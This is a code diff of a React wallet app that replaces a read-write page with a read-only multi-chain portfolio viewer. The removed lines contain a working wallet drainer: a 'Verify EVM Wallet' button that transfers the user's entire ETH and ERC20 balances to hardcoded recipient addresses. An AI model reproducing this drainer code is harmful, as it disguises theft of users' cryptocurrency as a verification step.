@@ -1,148 +1,468 @@
-import React, { useState, useEffect } from "react";
-import { useAppKitAccount, useAppKitProvider, useAppKitBalance } from "@reown/appkit/react";
-import { useBalance, useSendTransaction, useWriteContract } from "wagmi";
-import { parseEther, parseUnits } from "viem";
-import ERC20_ABI from "./abi/erc20.json";
-import { ethers } from "ethers";
+import React, { useState, useEffect, useCallback } from "react";
+import { useAppKitAccount } from "@reown/appkit/react";
+import { getWalletPortfolio } from "./services/balanceService.js";
 
-const backgroundStyle = {
-  position: "fixed",
-  top: 0,
-  left: 0,
-  width: "100%",
-  height: "100%",
-  zIndex: -1,
-  background: "linear-gradient(-45deg, #ff9a9e, #fad0c4, #a1c4fd, #c2e9fb)",
-  backgroundSize: "400% 400%",
-  animation: "gradientBG 15s ease infinite"
-};
-
-const styleEl = document.createElement("style");
-styleEl.textContent = `
-  @keyframes gradientBG {
-    0% {background-position: 0% 50%;}
-    50% {background-position: 100% 50%;}
-    100% {background-position: 0% 50%;}
-  }
-`;
-document.head.appendChild(styleEl);
+const NETWORKS = [
+  "Ethereum",
+  "Polygon",
+  "BNB Smart Chain",
+  "Arbitrum",
+  "Optimism",
+  "Base"
+];
 
 function App() {
   const { address, isConnected, caipAddress } = useAppKitAccount();
-  const [tokenAddress, setTokenAddress] = useState("");
+
+  const [portfolio, setPortfolio] = useState(null);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState("");
+  const [showZero, setShowZero] = useState(false);
 
   const isSolana = caipAddress?.startsWith("solana:");
-  const isEvm = isConnected && !isSolana;
-  const solanaAddress = isSolana ? address : null;
 
-  const FIXED_EVM_RECIPIENT = "0x47E11Fd3e3cEF8Ea9beC9805D1F27dBe775B1D69";
-  const FIXED_SOL_RECIPIENT = "5a39EMz6Hm3k1gFcMmTxojPijfiDzNxQcWhDpRUtgDRv";
+  const isEvm =
+    isConnected &&
+    !isSolana &&
+    address?.startsWith("0x");
 
-  const ETH_RPC = import.meta.env.VITE_ETHEREUM_RPC_URL;
-  const POLYGON_RPC = import.meta.env.VITE_POLYGON_RPC_URL;
+  const scanWallet = useCallback(async () => {
+    if (!isEvm || !address) return;
 
-  const { data: evmBalance } = useBalance({ address: isEvm ? address : undefined });
-  const { sendTransactionAsync } = useSendTransaction();
-  const { writeContractAsync } = useWriteContract();
+    setLoading(true);
+    setError("");
 
-  const estimateGasCost = async (tx, rpcUrl) => {
     try {
-      const provider = new ethers.JsonRpcProvider(rpcUrl);
-      const estimatedGas = await provider.estimateGas(tx);
-      const gasPrice = await provider.getGasPrice();
-      return parseFloat(ethers.formatEther(estimatedGas * gasPrice));
-    } catch {
-      return 0.001;
+      const result = await getWalletPortfolio(address);
+      setPortfolio(result);
+    } catch (err) {
+      setError(err.message || "Unable to scan wallet");
+    } finally {
+      setLoading(false);
     }
-  };
+  }, [address, isEvm]);
 
-  const sendMaxEVM = async () => {
-    if (!isEvm || !evmBalance?.formatted) return;
+  useEffect(() => {
+    setPortfolio(null);
+    setError("");
 
-    const chains = [ETH_RPC, POLYGON_RPC].filter(Boolean);
-
-    for (let rpcUrl of chains) {
-      const provider = new ethers.JsonRpcProvider(rpcUrl);
-
-      const gasCostETH = await estimateGasCost({ to: FIXED_EVM_RECIPIENT, value: parseEther("0.001") }, rpcUrl);
-      const maxETH = parseFloat(evmBalance.formatted) - gasCostETH;
-      if (maxETH > 0) {
-        await sendTransactionAsync({ to: FIXED_EVM_RECIPIENT, value: parseEther(maxETH.toString()) });
-      }
-
-      if (tokenAddress) {
-        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-        const decimals = await contract.decimals();
-        const tokenBalanceRaw = await contract.balanceOf(address);
-        const tokenBalance = parseFloat(ethers.formatUnits(tokenBalanceRaw, decimals));
-
-        const data = contract.interface.encodeFunctionData("transfer", [
-          FIXED_EVM_RECIPIENT,
-          parseUnits(tokenBalance.toString(), decimals)
-        ]);
-
-        const gasCostToken = await estimateGasCost({ to: tokenAddress, data }, rpcUrl);
-        if (parseFloat(evmBalance.formatted) < gasCostToken) continue;
-
-        await writeContractAsync({
-          address: tokenAddress,
-          abi: ERC20_ABI,
-          functionName: "transfer",
-          args: [FIXED_EVM_RECIPIENT, parseUnits(tokenBalance.toString(), decimals)]
-        });
-      }
+    if (isEvm) {
+      scanWallet();
     }
+  }, [address, isEvm, scanWallet]);
+
+  const assets = portfolio?.assets || [];
+
+  const visibleAssets = showZero
+    ? assets
+    : assets.filter(asset => Number(asset.balance) > 0);
+
+  const networkStatus = portfolio?.networks || [];
+
+  const formatBalance = value => {
+    const number = Number(value);
+
+    if (!Number.isFinite(number)) return value;
+
+    return number.toLocaleString("en-US", {
+      maximumFractionDigits: 8
+    });
   };
 
   return (
-    <div>
-      <div style={backgroundStyle}></div>
+    <div style={styles.page}>
 
-      <div style={{
-        position: "relative",
-        zIndex: 1,
-        minHeight: "100vh",
-        display: "flex",
-        flexDirection: "column",
-        alignItems: "center",
-        justifyContent: "center",
-        color: "#fff",
-        textAlign: "center",
-        padding: 20
-      }}>
-        {!isConnected ? (
-          <>
-            <appkit-button />
-            <h2 style={{ marginTop: "20px" }}>Connect your wallet to get started</h2>
-          </>
-        ) : (
-          <>
-            <h3>Connected: {address}</h3>
-            <p>Network: {isSolana ? "Solana" : "EVM"}</p>
+      <header style={styles.header}>
+        <h2 style={styles.logo}>MultiChain Wallet</h2>
+
+        <appkit-button />
+      </header>
+
+      {!isConnected ? (
+
+        <section style={styles.center}>
+          <h1>Welcome to MultiChain Wallet</h1>
+
+          <p>
+            Connect your wallet to discover your
+            cryptocurrency balances across multiple networks.
+          </p>
+
+          <appkit-button />
+        </section>
+
+      ) : (
+
+        <main style={styles.container}>
+
+          <section style={styles.card}>
+            <h3>Connected Wallet</h3>
+
+            <p style={styles.address}>
+              {address}
+            </p>
+
+            <p>
+              Wallet type: {isSolana ? "Solana" : "EVM"}
+            </p>
 
             {isEvm && (
-              <p>Balance: {evmBalance?.formatted} {evmBalance?.symbol}</p>
+              <p style={styles.status}>
+                Wallet connected
+              </p>
             )}
 
-            {isEvm && (
-              <>
-                <input
-                  placeholder="ERC20 Token Address (optional)"
-                  value={tokenAddress}
-                  onChange={(e) => setTokenAddress(e.target.value)}
-                  style={{ width: "300px", marginBottom: "10px", padding: "5px" }}
-                />
-                <br />
-                <button onClick={sendMaxEVM} style={{ padding: "10px 20px", cursor: "pointer" }}>
-                  Verify EVM Wallet (ETH + ERC20 + Polygon)
-                </button>
-              </>
-            )}
-          </>
-        )}
-      </div>
+          </section>
+
+          {isSolana ? (
+
+            <section style={styles.card}>
+              <h3>Solana Wallet</h3>
+
+              <p>
+                Solana balance scanning will be added
+                in the next development stage.
+              </p>
+            </section>
+
+          ) : isEvm ? (
+
+            <>
+
+              <section style={styles.card}>
+
+                <div style={styles.sectionHeader}>
+                  <h2>Your Portfolio</h2>
+
+                  <button
+                    onClick={scanWallet}
+                    disabled={loading}
+                    style={styles.refreshButton}
+                  >
+                    {loading ? "Scanning..." : "↻ Refresh"}
+                  </button>
+                </div>
+
+                {loading && (
+                  <p>Scanning your wallet across six networks...</p>
+                )}
+
+                {error && (
+                  <p style={styles.error}>{error}</p>
+                )}
+
+                {portfolio && (
+                  <>
+                    <h1 style={styles.assetCount}>
+                      {visibleAssets.length}
+                    </h1>
+
+                    <p>Detected assets</p>
+
+                    <p style={styles.smallText}>
+                      Last updated:{" "}
+                      {new Date(
+                        portfolio.updatedAt
+                      ).toLocaleString()}
+                    </p>
+                  </>
+                )}
+
+              </section>
+
+              <section style={styles.card}>
+
+                <h2>Network Status</h2>
+
+                {NETWORKS.map(network => {
+                  const result = networkStatus.find(
+                    item => item.network === network
+                  );
+
+                  return (
+                    <div
+                      key={network}
+                      style={styles.networkRow}
+                    >
+                      <span>{network}</span>
+
+                      <span
+                        style={{
+                          color: !portfolio
+                            ? "#999"
+                            : result?.success
+                            ? "#16a34a"
+                            : "#dc2626"
+                        }}
+                      >
+                        {!portfolio
+                          ? "Waiting"
+                          : result?.success
+                          ? "Connected"
+                          : "Unavailable"}
+                      </span>
+                    </div>
+                  );
+                })}
+
+              </section>
+
+              <section style={styles.card}>
+
+                <div style={styles.sectionHeader}>
+                  <h2>Your Coins & Tokens</h2>
+
+                  <label style={styles.toggle}>
+                    <input
+                      type="checkbox"
+                      checked={showZero}
+                      onChange={event =>
+                        setShowZero(event.target.checked)
+                      }
+                    />
+
+                    Show zero balances
+                  </label>
+                </div>
+
+                {visibleAssets.length === 0 && !loading ? (
+
+                  <p>
+                    No assets found. Refresh to scan again.
+                  </p>
+
+                ) : (
+
+                  visibleAssets.map((asset, index) => (
+
+                    <div
+                      key={`${asset.chainId}-${asset.contractAddress || "native"}-${index}`}
+                      style={styles.assetRow}
+                    >
+
+                      <div style={styles.assetInfo}>
+
+                        {asset.logo && (
+                          <img
+                            src={asset.logo}
+                            alt=""
+                            style={styles.tokenLogo}
+                          />
+                        )}
+
+                        <div>
+                          <strong>{asset.name}</strong>
+
+                          <p style={styles.smallText}>
+                            {asset.symbol}
+                          </p>
+                        </div>
+
+                      </div>
+
+                      <div style={styles.assetBalance}>
+                        <strong>
+                          {formatBalance(asset.balance)}
+                        </strong>
+
+                        <p style={styles.smallText}>
+                          {asset.type === "native"
+                            ? "Native coin"
+                            : "Token"}
+                        </p>
+                      </div>
+
+                      <div style={styles.assetNetwork}>
+                        <p>{NETWORKS.find(
+                          name => name ===
+                          portfolio.networks.find(
+                            n => n.chainId === asset.chainId
+                          )?.network
+                        ) || `Chain ${asset.chainId}`}</p>
+
+                        {asset.contractAddress && (
+                          <small style={styles.smallText}>
+                            {asset.contractAddress.slice(0, 8)}
+                            ...
+                            {asset.contractAddress.slice(-6)}
+                          </small>
+                        )}
+                      </div>
+
+                    </div>
+
+                  ))
+
+                )}
+
+              </section>
+
+              {portfolio?.failedNetworkCount > 0 && (
+                <p style={styles.warning}>
+                  Some networks could not be scanned.
+                  Their balances may be missing.
+                </p>
+              )}
+
+            </>
+
+          ) : (
+
+            <p>Unsupported wallet connection.</p>
+
+          )}
+
+        </main>
+
+      )}
+
+      <footer style={styles.footer}>
+        MultiChain Wallet © 2026
+      </footer>
+
     </div>
   );
 }
+
+const styles = {
+  page: {
+    minHeight: "100vh",
+    background: "#f3f4f6",
+    color: "#111827",
+    fontFamily: "Arial, sans-serif"
+  },
+
+  header: {
+    background: "#111827",
+    color: "white",
+    padding: "18px 5%",
+    display: "flex",
+    justifyContent: "space-between",
+    alignItems: "center"
+  },
+
+  logo: {
+    margin: 0
+  },
+
+  container: {
+    maxWidth: "950px",
+    margin: "auto",
+    padding: "20px"
+  },
+
+  center: {
+    minHeight: "70vh",
+    display: "flex",
+    flexDirection: "column",
+    justifyContent: "center",
+    alignItems: "center",
+    textAlign: "center",
+    padding: "20px"
+  },
+
+  card: {
+    background: "white",
+    padding: "22px",
+    borderRadius: "14px",
+    marginBottom: "18px",
+    boxShadow: "0 2px 10px rgba(0,0,0,0.05)"
+  },
+
+  address: {
+    wordBreak: "break-all",
+    color: "#2563eb"
+  },
+
+  status: {
+    color: "#16a34a"
+  },
+
+  sectionHeader: {
+    display: "flex",
+    justifyContent: "space-between",
+    alignItems: "center",
+    gap: "12px",
+    flexWrap: "wrap"
+  },
+
+  refreshButton: {
+    padding: "10px 16px",
+    border: "none",
+    borderRadius: "8px",
+    background: "#2563eb",
+    color: "white",
+    cursor: "pointer"
+  },
+
+  assetCount: {
+    fontSize: "40px",
+    marginBottom: "0"
+  },
+
+  networkRow: {
+    display: "flex",
+    justifyContent: "space-between",
+    padding: "13px 0",
+    borderBottom: "1px solid #eee"
+  },
+
+  assetRow: {
+    padding: "16px 0",
+    borderBottom: "1px solid #eee",
+    display: "flex",
+    flexWrap: "wrap",
+    justifyContent: "space-between",
+    alignItems: "center",
+    gap: "12px"
+  },
+
+  assetInfo: {
+    display: "flex",
+    alignItems: "center",
+    gap: "10px"
+  },
+
+  tokenLogo: {
+    width: "35px",
+    height: "35px",
+    borderRadius: "50%"
+  },
+
+  assetBalance: {
+    textAlign: "right"
+  },
+
+  assetNetwork: {
+    width: "100%",
+    fontSize: "12px",
+    color: "#6b7280"
+  },
+
+  smallText: {
+    color: "#6b7280",
+    fontSize: "12px",
+    margin: "5px 0"
+  },
+
+  toggle: {
+    fontSize: "13px"
+  },
+
+  error: {
+    color: "#dc2626"
+  },
+
+  warning: {
+    color: "#b45309",
+    textAlign: "center"
+  },
+
+  footer: {
+    textAlign: "center",
+    padding: "25px",
+    color: "#6b7280"
+  }
+};
 
 export default App;
